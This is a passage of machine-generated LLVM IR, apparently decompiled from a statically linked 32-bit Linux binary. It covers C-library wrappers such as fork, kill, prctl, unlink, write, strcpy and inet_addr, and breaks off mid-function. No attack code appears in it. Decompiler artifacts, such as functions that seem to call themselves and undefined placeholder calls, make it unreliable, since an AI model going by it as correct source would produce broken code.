dec_label_pc_8049b58:                             ; preds = %entry, %dec_label_pc_8049b4c
  %v0_8049b59 = phi i32 [ %v1_8049b40, %entry ], [ -1, %dec_label_pc_8049b4c ]
  %v2_8049b58 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049b58, i32* @edx, align 4
  %v2_8049b5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b5c, i32* @edi, align 4
  ret i32 %v0_8049b59

; uselistorder directives
  uselistorder i32 %v1_8049b40, { 1, 0, 2 }
  uselistorder i32 %v0_8049b38, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b58, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b60 = load i32, i32* @edi, align 4
  store i32 %v0_8049b60, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049b68 = load i32, i32* @ebx, align 4
  %v1_8049b70 = call i32 @close(i32 %arg1)
  store i32 %v0_8049b68, i32* @ebx, align 4
  store i32 %v1_8049b70, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049b70, -4095
  br i1 %tmp, label %dec_label_pc_8049b88, label %dec_label_pc_8049b7c

dec_label_pc_8049b7c:                             ; preds = %entry
  %v1_8049b7c = call i32 @__errno_location(i32 %v0_8049b68)
  %v0_8049b81 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b81 = sub i32 0, %v0_8049b81
  %v2_8049b83 = inttoptr i32 %v1_8049b7c to i32*
  store i32 %v1_8049b81, i32* %v2_8049b83, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b88

dec_label_pc_8049b88:                             ; preds = %entry, %dec_label_pc_8049b7c
  %v0_8049b89 = phi i32 [ %v1_8049b70, %entry ], [ -1, %dec_label_pc_8049b7c ]
  %v2_8049b8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b8c, i32* @edi, align 4
  ret i32 %v0_8049b89

; uselistorder directives
  uselistorder i32 %v1_8049b70, { 1, 0, 2 }
  uselistorder i32 %v0_8049b68, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b88, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b90 = load i32, i32* @ebx, align 4
  store i32 %v0_8049b90, i32* %stack_var_-4, align 4
  %v1_8049b99 = call i32 @fork(i32 %v0_8049b90)
  store i32 %v1_8049b99, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049b99, -4095
  br i1 %tmp, label %dec_label_pc_8049bb0, label %dec_label_pc_8049ba4

dec_label_pc_8049ba4:                             ; preds = %entry
  %v0_8049ba4 = load i32, i32* %stack_var_-4, align 4
  %v1_8049ba4 = call i32 @__errno_location(i32 %v0_8049ba4)
  %v0_8049ba9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049ba9 = sub i32 0, %v0_8049ba9
  %v2_8049bab = inttoptr i32 %v1_8049ba4 to i32*
  store i32 %v1_8049ba9, i32* %v2_8049bab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049bb0

dec_label_pc_8049bb0:                             ; preds = %entry, %dec_label_pc_8049ba4
  %v0_8049bb1 = phi i32 [ %v1_8049b99, %entry ], [ -1, %dec_label_pc_8049ba4 ]
  %v2_8049bb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049bb0, i32* @edx, align 4
  %v2_8049bb4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049bb4, i32* @ebx, align 4
  ret i32 %v0_8049bb1

; uselistorder directives
  uselistorder i32 %v1_8049b99, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049bb0, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049bb8 = load i32, i32* @ebx, align 4
  store i32 %v0_8049bb8, i32* %stack_var_-4, align 4
  %v1_8049bc1 = call i32 @getpid(i32 %v0_8049bb8)
  store i32 %v1_8049bc1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049bc1, -4095
  br i1 %tmp, label %dec_label_pc_8049bd8, label %dec_label_pc_8049bcc

dec_label_pc_8049bcc:                             ; preds = %entry
  %v0_8049bcc = load i32, i32* %stack_var_-4, align 4
  %v1_8049bcc = call i32 @__errno_location(i32 %v0_8049bcc)
  %v0_8049bd1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049bd1 = sub i32 0, %v0_8049bd1
  %v2_8049bd3 = inttoptr i32 %v1_8049bcc to i32*
  store i32 %v1_8049bd1, i32* %v2_8049bd3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049bd8

dec_label_pc_8049bd8:                             ; preds = %entry, %dec_label_pc_8049bcc
  %v0_8049bd9 = phi i32 [ %v1_8049bc1, %entry ], [ -1, %dec_label_pc_8049bcc ]
  %v2_8049bdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049bdc, i32* @ebx, align 4
  ret i32 %v0_8049bd9

; uselistorder directives
  uselistorder i32 %v1_8049bc1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049bd8, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049be0 = load i32, i32* @ebx, align 4
  store i32 %v0_8049be0, i32* %stack_var_-4, align 4
  %v1_8049be9 = call i32 @getppid(i32 %v0_8049be0)
  store i32 %v1_8049be9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049be9, -4095
  br i1 %tmp, label %dec_label_pc_8049c00, label %dec_label_pc_8049bf4

dec_label_pc_8049bf4:                             ; preds = %entry
  %v0_8049bf4 = load i32, i32* %stack_var_-4, align 4
  %v1_8049bf4 = call i32 @__errno_location(i32 %v0_8049bf4)
  %v0_8049bf9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049bf9 = sub i32 0, %v0_8049bf9
  %v2_8049bfb = inttoptr i32 %v1_8049bf4 to i32*
  store i32 %v1_8049bf9, i32* %v2_8049bfb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049c00

dec_label_pc_8049c00:                             ; preds = %entry, %dec_label_pc_8049bf4
  %v0_8049c01 = phi i32 [ %v1_8049be9, %entry ], [ -1, %dec_label_pc_8049bf4 ]
  %v2_8049c04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049c04, i32* @ebx, align 4
  ret i32 %v0_8049c01

; uselistorder directives
  uselistorder i32 %v1_8049be9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_8049c00, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049c08 = load i32, i32* @ebx, align 4
  store i32 %v0_8049c08, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8049c1b = call i32 @kill(i32 %v0_8049c08, i32 %tmp4)
  store i32 %v2_8049c1b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8049c1b, -4095
  br i1 %tmp, label %dec_label_pc_8049c34, label %dec_label_pc_8049c28

dec_label_pc_8049c28:                             ; preds = %entry
  %v0_8049c28 = load i32, i32* %stack_var_-4, align 4
  %v1_8049c28 = call i32 @__errno_location(i32 %v0_8049c28)
  %v0_8049c2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c2d = sub i32 0, %v0_8049c2d
  %v2_8049c2f = inttoptr i32 %v1_8049c28 to i32*
  store i32 %v1_8049c2d, i32* %v2_8049c2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049c34

dec_label_pc_8049c34:                             ; preds = %entry, %dec_label_pc_8049c28
  %v0_8049c35 = phi i32 [ %v2_8049c1b, %entry ], [ -1, %dec_label_pc_8049c28 ]
  %v2_8049c34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049c34, i32* @edx, align 4
  %v2_8049c38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049c38, i32* @ebx, align 4
  ret i32 %v0_8049c35

; uselistorder directives
  uselistorder i32 %v2_8049c1b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049c34, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049c3c = load i32, i32* @edi, align 4
  %v0_8049c3d = load i32, i32* @esi, align 4
  store i32 %v0_8049c3d, i32* %stack_var_-8, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8049c5d = call i32 @prctl(i32 %v0_8049c55, i32 %v0_8049c3d)
  store i32 %v0_8049c55, i32* @ebx, align 4
  store i32 %v3_8049c5d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8049c5d, -4095
  br i1 %tmp, label %dec_label_pc_8049c75, label %dec_label_pc_8049c69

dec_label_pc_8049c69:                             ; preds = %entry
  %v1_8049c69 = call i32 @__errno_location(i32 %v0_8049c55)
  %v0_8049c6e = load i32, i32* %esi.global-to-local, align 4
  %v1_8049c6e = sub i32 0, %v0_8049c6e
  %v2_8049c70 = inttoptr i32 %v1_8049c69 to i32*
  store i32 %v1_8049c6e, i32* %v2_8049c70, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049c75

dec_label_pc_8049c75:                             ; preds = %entry, %dec_label_pc_8049c69
  %v0_8049c76 = phi i32 [ %v3_8049c5d, %entry ], [ -1, %dec_label_pc_8049c69 ]
  %v2_8049c78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049c78, i32* @esi, align 4
  store i32 %v0_8049c3c, i32* @edi, align 4
  ret i32 %v0_8049c76

; uselistorder directives
  uselistorder i32 %v3_8049c5d, { 1, 0, 2 }
  uselistorder i32 %v0_8049c55, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_8049c75, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049c7d = load i32, i32* @esi, align 4
  store i32 %v0_8049c7d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8049c95 = load i32, i32* @ebx, align 4
  %v1_8049c9d = call i32 @int80_syscall(i32 142)
  store i32 %v0_8049c95, i32* @ebx, align 4
  store i32 %v1_8049c9d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049c9d, -4095
  br i1 %tmp, label %dec_label_pc_8049cb5, label %dec_label_pc_8049ca9

dec_label_pc_8049ca9:                             ; preds = %entry
  %v1_8049ca9 = call i32 @__errno_location(i32 %v0_8049c95)
  %v0_8049cae = load i32, i32* %esi.global-to-local, align 4
  %v1_8049cae = sub i32 0, %v0_8049cae
  %v2_8049cb0 = inttoptr i32 %v1_8049ca9 to i32*
  store i32 %v1_8049cae, i32* %v2_8049cb0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049cb5

dec_label_pc_8049cb5:                             ; preds = %entry, %dec_label_pc_8049ca9
  %v0_8049cb6 = phi i32 [ %v1_8049c9d, %entry ], [ -1, %dec_label_pc_8049ca9 ]
  %v2_8049cb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049cb8, i32* @esi, align 4
  ret i32 %v0_8049cb6

; uselistorder directives
  uselistorder i32 %v1_8049c9d, { 1, 0, 2 }
  uselistorder i32 %v0_8049c95, { 1, 0 }
  uselistorder label %dec_label_pc_8049cb5, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049cbc = load i32, i32* @edi, align 4
  store i32 %v0_8049cbc, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8049cc4 = load i32, i32* @ebx, align 4
  %v2_8049ccc = call i32 @time(i32* %arg1)
  store i32 %v0_8049cc4, i32* @ebx, align 4
  store i32 %v2_8049ccc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8049ccc, -4095
  br i1 %tmp, label %dec_label_pc_8049ce4, label %dec_label_pc_8049cd8

dec_label_pc_8049cd8:                             ; preds = %entry
  %v1_8049cd8 = call i32 @__errno_location(i32 %v0_8049cc4)
  %v0_8049cdd = load i32, i32* %edi.global-to-local, align 4
  %v1_8049cdd = sub i32 0, %v0_8049cdd
  %v2_8049cdf = inttoptr i32 %v1_8049cd8 to i32*
  store i32 %v1_8049cdd, i32* %v2_8049cdf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049ce4

dec_label_pc_8049ce4:                             ; preds = %entry, %dec_label_pc_8049cd8
  %v0_8049ce5 = phi i32 [ %v2_8049ccc, %entry ], [ -1, %dec_label_pc_8049cd8 ]
  %v2_8049ce4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049ce4, i32* @edx, align 4
  %v2_8049ce8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049ce8, i32* @edi, align 4
  ret i32 %v0_8049ce5

; uselistorder directives
  uselistorder i32 %v2_8049ccc, { 1, 0, 2 }
  uselistorder i32 %v0_8049cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8049ce4, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049cec = load i32, i32* @edi, align 4
  store i32 %v0_8049cec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8049cf4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049cfc = call i32 @unlink(i32 %v0_8049cf4)
  store i32 %v0_8049cf4, i32* @ebx, align 4
  store i32 %v1_8049cfc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049cfc, -4095
  br i1 %tmp, label %dec_label_pc_8049d14, label %dec_label_pc_8049d08

dec_label_pc_8049d08:                             ; preds = %entry
  %v1_8049d08 = call i32 @__errno_location(i32 %v0_8049cf4)
  %v0_8049d0d = load i32, i32* %edi.global-to-local, align 4
  %v1_8049d0d = sub i32 0, %v0_8049d0d
  %v2_8049d0f = inttoptr i32 %v1_8049d08 to i32*
  store i32 %v1_8049d0d, i32* %v2_8049d0f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049d14

dec_label_pc_8049d14:                             ; preds = %entry, %dec_label_pc_8049d08
  %v0_8049d15 = phi i32 [ %v1_8049cfc, %entry ], [ -1, %dec_label_pc_8049d08 ]
  %v2_8049d18 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049d18, i32* @edi, align 4
  ret i32 %v0_8049d15

; uselistorder directives
  uselistorder i32 %v1_8049cfc, { 1, 0, 2 }
  uselistorder i32 %v0_8049cf4, { 1, 0, 2 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049d14, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8049d2d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_8049d2d
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049d38 = load i32, i32* @edi, align 4
  store i32 %v0_8049d38, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049d48 = load i32, i32* @ebx, align 4
  %v4_8049d50 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8049d48, i32* @ebx, align 4
  store i32 %v4_8049d50, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8049d50, -4095
  br i1 %tmp, label %dec_label_pc_8049d68, label %dec_label_pc_8049d5c

dec_label_pc_8049d5c:                             ; preds = %entry
  %v1_8049d5c = call i32 @__errno_location(i32 %v0_8049d48)
  %v0_8049d61 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049d61 = sub i32 0, %v0_8049d61
  %v2_8049d63 = inttoptr i32 %v1_8049d5c to i32*
  store i32 %v1_8049d61, i32* %v2_8049d63, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049d68

dec_label_pc_8049d68:                             ; preds = %entry, %dec_label_pc_8049d5c
  %v0_8049d69 = phi i32 [ %v4_8049d50, %entry ], [ -1, %dec_label_pc_8049d5c ]
  %v2_8049d68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049d68, i32* @edx, align 4
  %v2_8049d6c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049d6c, i32* @edi, align 4
  ret i32 %v0_8049d69

; uselistorder directives
  uselistorder i32 %v4_8049d50, { 1, 0, 2 }
  uselistorder i32 %v0_8049d48, { 1, 0 }
  uselistorder label %dec_label_pc_8049d68, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8049d74 = add i32 %arg1, 128
  %v6_8049d7f = icmp ugt i32 %v1_8049d74, 383
  br i1 %v6_8049d7f, label %dec_label_pc_8049d8a, label %dec_label_pc_8049d81

dec_label_pc_8049d81:                             ; preds = %entry
  %v0_8049d81 = load i32, i32* bitcast (i32** @global_var_8052040.27 to i32*), align 64
  %v2_8049d86 = mul i32 %arg1, 2
  %v3_8049d86 = add i32 %v0_8049d81, %v2_8049d86
  %v4_8049d86 = inttoptr i32 %v3_8049d86 to i16*
  %v5_8049d86 = load i16, i16* %v4_8049d86, align 2
  %v6_8049d86 = sext i16 %v5_8049d86 to i32
  store i32 %v6_8049d86, i32* @edx, align 4
  br label %dec_label_pc_8049d8a

dec_label_pc_8049d8a:                             ; preds = %entry, %dec_label_pc_8049d81
  %v0_8049d8a = phi i32 [ %arg1, %entry ], [ %v6_8049d86, %dec_label_pc_8049d81 ]
  ret i32 %v0_8049d8a

; uselistorder directives
  uselistorder label %dec_label_pc_8049d8a, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8052520.28 to i32)
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i64 @__decompiler_undefined_function_3()
  %stack_var_-16 = alloca i32, align 4
  %v2_8049d9b = ptrtoint i32* %stack_var_-16 to i32
  %v1_8049da0 = call i32 @times(i32 %v2_8049d9b)
  %v4_8049da5 = trunc i64 %tmp to i32
  %v4_8049da9 = load i32, i32* %stack_var_-16, align 4
  %v5_8049da9 = add i32 %v4_8049da9, %v4_8049da5
  %v3_8049db0 = mul i32 %v5_8049da9, 10000
  %v1_8049db6 = and i32 %v3_8049db0, 2147483632
  ret i32 %v1_8049db6
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8049dbc = load i32, i32* @edi, align 4
  %v4_8049dc5 = ptrtoint i8* %arg1 to i32
  %v5_8049dc9 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8049dc9 = ptrtoint i8* %v5_8049dc9 to i32
  store i32 %v6_8049dc9, i32* @ecx, align 4
  store i32 %v0_8049dbc, i32* @edi, align 4
  ret i32 %v4_8049dc5

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8049dd5 = ptrtoint i8* %arg1 to i32
  %v2_8049ddd = mul i32 %arg2, 256
  %v3_8049ddd = and i32 %v2_8049ddd, 65280
  %v4_8049ddd = and i32 %arg2, -65281
  %v5_8049ddd = or i32 %v3_8049ddd, %v4_8049ddd
  %v8_8049ddf.pre = load i1, i1* @df, align 1
  %v9_8049ddf = select i1 %v8_8049ddf.pre, i32 -1, i32 1
  br label %dec_label_pc_8049ddf

dec_label_pc_8049ddf:                             ; preds = %dec_label_pc_8049de4, %entry
  %v4_8049ddf = phi i32 [ %v6_8049ddf, %dec_label_pc_8049de4 ], [ %v5_8049ddd, %entry ]
  %v7_8049ddf = phi i32 [ %v10_8049ddf, %dec_label_pc_8049de4 ], [ %v4_8049dd5, %entry ]
  %v1_8049ddf = inttoptr i32 %v7_8049ddf to i8*
  %v2_8049ddf = load i8, i8* %v1_8049ddf, align 1
  %v10_8049ddf = add i32 %v7_8049ddf, %v9_8049ddf
  %v3_8049de0 = udiv i32 %v4_8049ddf, 256
  %v4_8049de0 = trunc i32 %v3_8049de0 to i8
  %v16_8049de0 = icmp eq i8 %v2_8049ddf, %v4_8049de0
  br i1 %v16_8049de0, label %dec_label_pc_8049ded.loopexit, label %dec_label_pc_8049de4

dec_label_pc_8049de4:                             ; preds = %dec_label_pc_8049ddf
  %v3_8049ddf = zext i8 %v2_8049ddf to i32
  %v5_8049ddf = and i32 %v4_8049ddf, -256
  %v6_8049ddf = or i32 %v3_8049ddf, %v5_8049ddf
  %v4_8049de4 = icmp eq i8 %v2_8049ddf, 0
  %v1_8049de6 = icmp eq i1 %v4_8049de4, false
  br i1 %v1_8049de6, label %dec_label_pc_8049ddf, label %dec_label_pc_8049de8

dec_label_pc_8049de8:                             ; preds = %dec_label_pc_8049de4
  br label %dec_label_pc_8049ded

dec_label_pc_8049ded.loopexit:                    ; preds = %dec_label_pc_8049ddf
  %phitmp = add i32 %v10_8049ddf, -1
  br label %dec_label_pc_8049ded

dec_label_pc_8049ded:                             ; preds = %dec_label_pc_8049ded.loopexit, %dec_label_pc_8049de8
  %v0_8049ded = phi i32 [ 0, %dec_label_pc_8049de8 ], [ %phitmp, %dec_label_pc_8049ded.loopexit ]
  ret i32 %v0_8049ded

; uselistorder directives
  uselistorder i8 %v2_8049ddf, { 1, 2, 0 }
  uselistorder i32 %v4_8049ddf, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049df5 = load i32, i32* @esi, align 4
  store i32 %v0_8049df5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8049dfd = ptrtoint i8* %arg1 to i32
  store i32 %v4_8049dfd, i32* %edi.global-to-local, align 4
  %v4_8049e01.pre = load i32, i32* @eax, align 4
  %v8_8049e01.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8049e01

dec_label_pc_8049e01:                             ; preds = %dec_label_pc_8049e01.dec_label_pc_8049e01_crit_edge, %entry
  %v2_8049e02 = phi i32 [ %v7_8049e02, %dec_label_pc_8049e01.dec_label_pc_8049e01_crit_edge ], [ %v4_8049dfd, %entry ]
  %v8_8049e01 = phi i1 [ %v5_8049e02, %dec_label_pc_8049e01.dec_label_pc_8049e01_crit_edge ], [ %v8_8049e01.pre, %entry ]
  %v4_8049e01 = phi i32 [ %v0_8049e03, %dec_label_pc_8049e01.dec_label_pc_8049e01_crit_edge ], [ %v4_8049e01.pre, %entry ]
  %v7_8049e01 = phi i32 [ %v0_8049e01.pre, %dec_label_pc_8049e01.dec_label_pc_8049e01_crit_edge ], [ %arg2, %entry ]
  %v1_8049e01 = inttoptr i32 %v7_8049e01 to i8*
  %v2_8049e01 = load i8, i8* %v1_8049e01, align 1
  %v3_8049e01 = zext i8 %v2_8049e01 to i32
  %v5_8049e01 = and i32 %v4_8049e01, -256
  %v6_8049e01 = or i32 %v3_8049e01, %v5_8049e01
  store i32 %v6_8049e01, i32* %eax.global-to-local, align 4
  %v9_8049e01 = select i1 %v8_8049e01, i32 -1, i32 1
  %v10_8049e01 = add i32 %v7_8049e01, %v9_8049e01
  store i32 %v10_8049e01, i32* %esi.global-to-local, align 4
  %v3_8049e02 = inttoptr i32 %v2_8049e02 to i8*
  store i8 %v2_8049e01, i8* %v3_8049e02, align 1
  %v4_8049e02 = load i32, i32* %edi.global-to-local, align 4
  %v5_8049e02 = load i1, i1* @df, align 1
  %v6_8049e02 = select i1 %v5_8049e02, i32 -1, i32 1
  %v7_8049e02 = add i32 %v6_8049e02, %v4_8049e02
  store i32 %v7_8049e02, i32* %edi.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %eax.global-to-local, align 4
  %v3_8049e03 = trunc i32 %v0_8049e03 to i8
  %v4_8049e03 = icmp eq i8 %v3_8049e03, 0
  %v1_8049e05 = icmp eq i1 %v4_8049e03, false
  br i1 %v1_8049e05, label %dec_label_pc_8049e01.dec_label_pc_8049e01_crit_edge, label %dec_label_pc_8049e07

dec_label_pc_8049e01.dec_label_pc_8049e01_crit_edge: ; preds = %dec_label_pc_8049e01
  %v0_8049e01.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049e01

dec_label_pc_8049e07:                             ; preds = %dec_label_pc_8049e01
  store i32 %v4_8049dfd, i32* %eax.global-to-local, align 4
  %v2_8049e0b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049e0b, i32* @edx, align 4
  %v2_8049e0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049e0c, i32* @esi, align 4
  ret i32 %v4_8049dfd

; uselistorder directives
  uselistorder i32 %v0_8049e03, { 1, 0 }
  uselistorder i32 %v7_8049e02, { 1, 0 }
  uselistorder i1 %v5_8049e02, { 1, 0 }
  uselistorder i32 %v4_8049dfd, { 1, 2, 0, 3 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8049e20 = inttoptr i32 %arg2 to i8*
  %v3_8049e20 = call i32 @memmove(i8* %v2_8049e20, i32 %arg1)
  ret i32 %v3_8049e20
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8049e38 = inttoptr i32 %arg1 to i8*
  %v4_8049e38 = call i32 @strtok_r(i8* %v3_8049e38, i32 %arg2, i32 ptrtoint (i32* @global_var_805231c.29 to i32))
  ret i32 %v4_8049e38
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8049e49 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8049e49 = zext i16 %v3_8049e49 to i32
  ret i32 %v4_8049e49
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049e55 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049e55
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8049e5d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8049e5d = zext i16 %v3_8049e5d to i32
  ret i32 %v4_8049e5d
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049e69 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049e69
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8049e6f = ptrtoint i32* %stack_var_-4 to i32
  %v2_8049e78 = inttoptr i32 %arg1 to i8*
  %v3_8049e78 = call i32 @inet_aton(i8* %v2_8049e78, i32 %v2_8049e6f)
  %v1_8049e83 = icmp eq i32 %v3_8049e78, 0
  br i1 %v1_8049e83, label %dec_label_pc_8049e8b, label %dec_label_pc_8049e87

dec_label_pc_8049e87:                             ; preds = %entry
  %v3_8049e87 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049e8b

dec_label_pc_8049e8b:                             ; preds = %entry, %dec_label_pc_8049e87
  %v0_8049e8b = phi i32 [ -1, %entry ], [ %v3_8049e87, %dec_label_pc_8049e87 ]
  ret i32 %v0_8049e8b

; uselistorder directives
  uselistorder label %dec_label_pc_8049e8b, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
